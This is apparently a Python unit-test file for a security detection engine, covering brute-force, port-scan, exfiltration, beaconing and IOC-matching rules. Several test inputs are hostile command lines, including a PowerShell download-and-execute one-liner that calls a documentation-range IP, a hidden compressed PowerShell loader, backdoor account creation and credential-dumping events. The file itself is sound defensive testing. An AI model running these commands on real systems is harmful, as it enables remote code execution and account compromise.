import datetime
import json
import os
import tempfile
import unittest

import models
from tests.helpers import TempDbTestCase
from utils.detection_engine import DetectionEngine, persist_finding, validate_rule, RuleConfigError
from utils.ioc_engine import IocEngine, import_iocs, load_synthetic_feed, validate_ioc
from utils.normalizer import normalize_log

BASE = datetime.datetime(2026, 1, 2, 3, 0, 0, tzinfo=datetime.timezone.utc)


def at(seconds):
    return (BASE + datetime.timedelta(seconds=seconds)).isoformat()


class RuleHarness(TempDbTestCase):

    def setUp(self):
        super().setUp()
        self.engine = DetectionEngine()
        self.assertEqual(self.engine.load_errors, [])

    def run_events(self, *raw_events):
        """Store events and evaluate them. Returns {rule_id: finding}."""
        logs = [normalize_log(dict(raw), raw.get('source', 'application')) for raw in raw_events]
        models.batch_insert_logs(logs)
        stored = models.get_logs_after(0)
        self.findings = self.engine.evaluate(stored, stored)
        return {f['rule']['id']: f for f in self.findings}

    def failed(self, offset, ip='203.0.113.1', user='admin'):
        return {'timestamp': at(offset), 'event_type': 'authentication_failure', 'src_ip': ip, 'user': user}

    def proc(self, name, command=None, parent=None, offset=0):
        return {'timestamp': at(offset), 'source': 'endpoint', 'event_type': 'process_start', 'hostname': 'h1',
                'user': 'u1', 'process_name': name, 'command_line': command, 'parent_process_name': parent}

    def conn(self, offset, src='10.0.0.1', dst='10.0.0.2', port=445, **extra):
        return dict({'timestamp': at(offset), 'source': 'network', 'src_ip': src, 'dst_ip': dst, 'dst_port': port}, **extra)


class IoaRuleTests(RuleHarness):

    def test_all_shipped_rules_load(self):
        self.assertEqual(len(self.engine.rules), 18)

    def test_brute_force_fires_at_threshold_not_below(self):
        self.assertNotIn('IOA-001', self.run_events(*[self.failed(i) for i in range(4)]))
        self.assertEqual(self.run_events(self.failed(4))['IOA-001']['observed'], 5)

    def test_brute_force_outside_window_does_not_fire(self):
        fired = self.run_events(*[self.failed(i * 100) for i in range(5)])
        self.assertNotIn('IOA-001', fired)

    def test_failures_from_different_sources_are_not_combined(self):
        fired = self.run_events(*[self.failed(i, ip=f'203.0.113.{i + 1}') for i in range(6)])
        self.assertNotIn('IOA-001', fired)

    def test_success_after_failures(self):
        ok = {'timestamp': at(10), 'event_type': 'authentication_success', 'src_ip': '203.0.113.1', 'user': 'admin'}
        fired = self.run_events(*[self.failed(i) for i in range(5)], ok)
        self.assertEqual(fired['IOA-002']['observed'], 5)

    def test_success_before_failures_is_not_a_sequence(self):
        ok = {'timestamp': at(0), 'event_type': 'authentication_success', 'src_ip': '203.0.113.1', 'user': 'admin'}
        fired = self.run_events(ok, *[self.failed(i + 1) for i in range(5)])
        self.assertNotIn('IOA-002', fired)

    def test_privilege_escalation(self):
        for command in ('sudo su -', 'net localgroup administrators bob /add', 'usermod -aG sudo bob'):
            with self.subTest(command=command):
                self.assertIn('IOA-003', self.run_events(self.proc('x', command)))
                self.setUp()

    def test_routine_sudo_is_not_escalation(self):
        self.assertNotIn('IOA-003', self.run_events(self.proc('sudo', 'sudo apt update')))

    def test_account_creation(self):
        self.assertIn('IOA-004', self.run_events(self.proc('net.exe', 'net user backdoor P@ss /add')))
        self.setUp()
        self.assertNotIn('IOA-004', self.run_events(self.proc('net.exe', 'net user bob')))

    def test_port_scan_needs_syn_attempts_on_many_ports(self):
        scan = [self.conn(i, dst='10.0.0.2', port=1000 + i, flags='S') for i in range(15)]
        self.assertEqual(self.run_events(*scan)['IOA-005']['observed'], 15)

    def test_server_replies_to_many_client_ports_are_not_a_scan(self):
        replies = [self.conn(i, src='8.8.8.8', dst='10.0.0.1', port=40000 + i, flags='PA') for i in range(40)]
        self.assertNotIn('IOA-005', self.run_events(*replies))

    def test_unusual_outbound_port(self):
        self.assertIn('IOA-006', self.run_events(self.conn(0, dst='198.51.100.5', port=4444)))
        self.setUp()
        self.assertNotIn('IOA-006', self.run_events(self.conn(0, dst='198.51.100.5', port=443)))

    def test_exfiltration_sums_outbound_bytes_only(self):
        big = 30 * 1024 * 1024
        fired = self.run_events(self.conn(0, dst='198.51.100.5', port=443, bytes=big),
                                self.conn(60, dst='198.51.100.6', port=443, bytes=big))
        self.assertEqual(fired['IOA-007']['observed'], 2 * big)

    def test_internal_transfer_is_not_exfiltration(self):
        self.assertNotIn('IOA-007', self.run_events(self.conn(0, dst='10.0.0.9', port=443, bytes=10 ** 9)))

    def test_approved_destination_is_not_exfiltration(self):
        self.assertNotIn('IOA-007', self.run_events(self.conn(0, dst='198.51.100.10', port=443, bytes=10 ** 9)))

    def test_suspicious_tools_and_commands(self):
        self.assertIn('IOA-008', self.run_events(self.proc('mimikatz.exe')))
        self.setUp()
        self.assertIn('IOA-008', self.run_events(self.proc('powershell.exe', 'powershell.exe -nop -enc SQBFAFgA')))

    def test_hidden_payload_powershell_fires(self):
        # The first two are command lines from a public attack sample in Sysmon format
        for command in ('powershell.exe  -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b=1}"',
                        '"powershell.exe" -noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))',
                        "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.1/a')"):
            with self.subTest(command=command[:40]):
                self.setUp()
                self.assertIn('IOA-008', self.run_events(self.proc('powershell.exe', command)))

    def test_ordinary_admin_powershell_is_quiet(self):
        for command in ('powershell.exe -NoProfile -NonInteractive -Command Get-Date',
                        r'powershell.exe -WindowStyle Hidden -File C:\scripts\backup.ps1',
                        'powershell.exe -NoProfile -Command Start-Process python -WindowStyle Hidden -ArgumentList app.py'):
            with self.subTest(command=command[:40]):
                self.setUp()
                self.assertNotIn('IOA-008', self.run_events(self.proc('powershell.exe', command)))

    def test_dotnet_is_not_net_and_plain_powershell_is_quiet(self):
        # The old rule matched 'net.exe' as a substring, so dotnet.exe counted as suspicious
        fired = self.run_events(self.proc('dotnet.exe', 'dotnet build'),
                                self.proc('powershell.exe', 'powershell.exe Get-Date', offset=1))
        self.assertEqual(fired, {})

    def test_lateral_movement_needs_several_hosts_on_admin_ports(self):
        self.assertEqual(self.run_events(*[self.conn(i, dst=f'10.0.0.{i + 10}') for i in range(3)])['IOA-009']['observed'], 3)
        self.setUp()
        self.assertNotIn('IOA-009', self.run_events(*[self.conn(i, dst=f'10.0.0.{i + 10}', port=443) for i in range(9)]))

    def test_remote_execution_tool(self):
        self.assertIn('IOA-010', self.run_events(self.proc('psexec.exe', r'psexec.exe \\10.0.0.2 cmd')))

    def test_credential_dumping(self):
        event = {'timestamp': at(0), 'source': 'endpoint', 'event_type': 'memory_access', 'hostname': 'h1',
                 'process_name': 'x.exe', 'details': 'Access to lsass.exe memory'}
        self.assertIn('IOA-011', self.run_events(event))

    def test_lsass_in_a_parent_name_is_not_a_dump(self):
        # The old rule searched free text, so any process started by lsass.exe matched
        event = {'timestamp': at(0), 'source': 'endpoint', 'event_type': 'process_start', 'process_name': 'x.exe',
                 'details': 'New process started: x.exe (PID: 1, Parent: lsass.exe)'}
        self.assertNotIn('IOA-011', self.run_events(event))

    def test_web_shell_upload_and_spawned_shell(self):
        upload = {'timestamp': at(0), 'event_type': 'file_upload', 'src_ip': '203.0.113.2', 'endpoint': '/upload/a.php'}
        self.assertIn('IOA-012', self.run_events(upload))
        self.setUp()
        self.assertIn('IOA-013', self.run_events(self.proc('cmd.exe', 'cmd /c whoami', parent='w3wp.exe')))
        self.setUp()
        self.assertNotIn('IOA-013', self.run_events(self.proc('cmd.exe', 'cmd /c dir', parent='explorer.exe')))

    def test_beaconing_requires_regular_timing(self):
        regular = [self.conn(i * 60, dst='198.51.100.5', port=443) for i in range(6)]
        self.assertAlmostEqual(self.run_events(*regular)['IOA-014']['metrics']['interval_seconds'], 60)
        self.setUp()
        irregular = [self.conn(t, dst='198.51.100.5', port=443) for t in (0, 13, 200, 215, 700, 712)]
        self.assertNotIn('IOA-014', self.run_events(*irregular))

    def test_password_spray_counts_distinct_accounts(self):
        self.assertIn('IOA-015', self.run_events(*[self.failed(i, user=f'user{i}') for i in range(5)]))
        self.setUp()
        self.assertNotIn('IOA-015', self.run_events(*[self.failed(i) for i in range(9)]))

    def test_historical_timestamps_are_detected(self):
        """Rules use event time, so an uploaded log from long ago still triggers them"""
        self.assertIn('IOA-001', self.run_events(*[self.failed(i) for i in range(5)]))

    def test_rows_with_null_fields_do_not_break_evaluation(self):
        fired = self.run_events({'timestamp': at(0), 'source': 'network'},
                                {'timestamp': at(0), 'source': 'endpoint', 'event_type': 'process_start'},
                                *[self.failed(i) for i in range(5)])
        self.assertIn('IOA-001', fired)


class AlertPersistenceTests(RuleHarness):

    def persist_all(self):
        return [persist_finding(f) for f in self.findings]

    def test_alert_records_rule_and_evidence(self):
        self.run_events(*[self.failed(i) for i in range(5)])
        alert_id, created = self.persist_all()[0]
        alert = models.get_alert(alert_id)
        self.assertTrue(created)
        self.assertEqual(alert['event_count'], 5)
        self.assertEqual(alert['evidence']['rule_logic']['threshold'], 5)
        self.assertEqual(alert['evidence']['matched_group'], {'src_ip': '203.0.113.1'})
        self.assertIn('5 failed logins from 203.0.113.1', alert['explanation'])
        self.assertEqual(alert['mitre'][0]['id'], 'T1110')
        self.assertEqual(len(models.get_alert_event_ids(alert_id)), 5)

    def test_repeat_finding_updates_instead_of_duplicating(self):
        self.run_events(*[self.failed(i) for i in range(5)])
        first_id, _ = self.persist_all()[0]
        self.run_events(self.failed(5))
        second_id, created = self.persist_all()[0]
        self.assertEqual(first_id, second_id)
        self.assertFalse(created)
        self.assertEqual(models.get_alert(first_id)['event_count'], 6)
        self.assertEqual(len(models.get_recent_alerts()), 1)

    def test_same_attack_much_later_is_a_new_alert(self):
        self.run_events(*[self.failed(i) for i in range(5)])
        self.persist_all()
        self.run_events(*[self.failed(5000 + i) for i in range(5)])
        new = [f for f in self.findings if f['last_ts'] > BASE.timestamp() + 1000]
        self.assertTrue(persist_finding(new[0])[1])
        self.assertEqual(len(models.get_recent_alerts()), 2)

    def test_confidence_rises_with_evidence_and_is_capped(self):
        self.run_events(*[self.failed(i) for i in range(5)])
        low = models.get_alert(self.persist_all()[0][0])['confidence']
        self.run_events(*[self.failed(i + 5) for i in range(100)])
        high = models.get_alert(self.persist_all()[0][0])['confidence']
        self.assertEqual(low, 70)
        self.assertEqual(high, 85)


class RuleConfigTests(unittest.TestCase):

    def base(self):
        return {'id': 'X', 'name': 'x', 'description': 'd', 'type': 'threshold', 'group_by': ['src_ip'],
                'window_seconds': 60, 'severity': 'LOW', 'confidence': 50, 'threshold': 1,
                'match': {'field': 'event_type', 'equals': 'a'}}

    def test_bad_definitions_are_refused(self):
        for change in ({'type': 'magic'}, {'severity': 'SEVERE'}, {'threshold': 0}, {'window_seconds': 0},
                       {'match': {'field': 'a', 'regex': '('}}, {'match': {'field': 'a'}}, {'confidence': 101}):
            with self.subTest(change=change), self.assertRaises(RuleConfigError):
                validate_rule(dict(self.base(), **change))

    def test_bad_rule_is_skipped_and_reported_without_losing_good_rules(self):
        bad = dict(self.base(), id='BAD', severity='NOPE')
        handle, path = tempfile.mkstemp(suffix='.json')
        with os.fdopen(handle, 'w') as out:
            json.dump({'rules': [self.base(), bad]}, out)
        try:
            engine = DetectionEngine(path)
        finally:
            os.unlink(path)
        self.assertEqual([r['id'] for r in engine.rules], ['X'])
        self.assertEqual(engine.load_errors[0]['rule'], 'BAD')

    def test_disabled_rule_does_not_load(self):
        handle, path = tempfile.mkstemp(suffix='.json')
        with os.fdopen(handle, 'w') as out:
            json.dump({'rules': [dict(self.base(), enabled=False)]}, out)
        try:
            self.assertEqual(DetectionEngine(path).rules, [])
        finally:
            os.unlink(path)

    def test_missing_rule_file_does_not_crash(self):
        engine = DetectionEngine('does-not-exist.json')
        self.assertEqual(engine.rules, [])
        self.assertTrue(engine.load_errors)


class IocTests(TempDbTestCase):

    def evaluate(self, **fields):
        log = normalize_log(dict({'timestamp': at(0)}, **fields), fields.get('source', 'network'))
        models.batch_insert_logs([log])
        return IocEngine().evaluate(models.get_logs_after(0))

    def test_synthetic_feed_loads_and_is_idempotent(self):
        self.assertEqual(load_synthetic_feed()['added'], 5)
        self.assertEqual(load_synthetic_feed(), {'added': 0, 'updated': 5, 'rejected': 0, 'errors': []})

    def test_ip_match_records_indicator_and_source(self):
        load_synthetic_feed()
        finding = self.evaluate(src_ip='10.0.0.1', dst_ip='198.51.100.77')[0]
        evidence = finding['extra_evidence']
        self.assertEqual(finding['rule']['id'], 'IOC-IP')
        self.assertEqual(evidence['matched_indicator'], '198.51.100.77')
        self.assertEqual(evidence['matched_field'], 'dst_ip')
        self.assertEqual(evidence['feed_source'], 'allsafe-synthetic-demo-feed')
        self.assertIn('not proof of compromise', finding['rule']['explanation'])

    def test_unknown_ip_is_not_treated_as_malicious(self):
        load_synthetic_feed()
        self.assertEqual(self.evaluate(src_ip='10.0.0.1', dst_ip='198.51.100.200'), [])

    def test_domain_url_and_hash_matches(self):
        load_synthetic_feed()
        cases = (
            ({'domain': 'update-check.malware-demo.example'}, 'IOC-DOMAIN'),
            ({'domain': 'a.update-check.malware-demo.example'}, 'IOC-DOMAIN'),
            ({'url': 'http://files.malware-demo.example/payload.bin'}, 'IOC-URL'),
            ({'file_hash': 'A' * 64}, 'IOC-HASH'),
        )
        for fields, rule_id in cases:
            with self.subTest(fields=fields):
                rules = {f['rule']['id'] for f in self.evaluate(source='application', **fields)}
                self.assertIn(rule_id, rules)

    def test_parent_of_an_indicator_domain_does_not_match(self):
        load_synthetic_feed()
        self.assertEqual(self.evaluate(domain='malware-demo.example'), [])

    def test_match_persists_as_alert(self):
        load_synthetic_feed()
        alert_id, _ = persist_finding(self.evaluate(src_ip='10.0.0.1', dst_ip='198.51.100.77')[0])
        alert = models.get_alert(alert_id)
        self.assertEqual((alert['detection_type'], alert['severity'], alert['confidence']), ('IOC', 'MEDIUM', 70))
        self.assertEqual(alert['evidence']['matched_indicator'], '198.51.100.77')

    def test_indicator_alone_cannot_be_critical(self):
        self.assertEqual(validate_ioc({'ioc_type': 'ip', 'value': '198.51.100.1', 'severity': 'CRITICAL'})['severity'], 'HIGH')

    def test_import_reports_bad_entries_and_keeps_good_ones(self):
        report = import_iocs([{'ioc_type': 'ip', 'value': '198.51.100.1'},
                              {'ioc_type': 'ip', 'value': 'nope'},
                              {'ioc_type': 'domain', 'value': 'not a domain'},
                              {'ioc_type': 'url', 'value': 'ftp://x'},
                              {'ioc_type': 'file_hash', 'value': 'zz'},
                              {'ioc_type': 'mutex', 'value': 'x'},
                              {'ioc_type': 'ip', 'value': '198.51.100.2', 'confidence': 900},
                              'not-an-object'])
        self.assertEqual((report['added'], report['rejected']), (1, 7))

    def test_no_indicators_is_fine(self):
        self.assertEqual(self.evaluate(src_ip='10.0.0.1', dst_ip='198.51.100.77'), [])


if __name__ == '__main__':
    unittest.main()
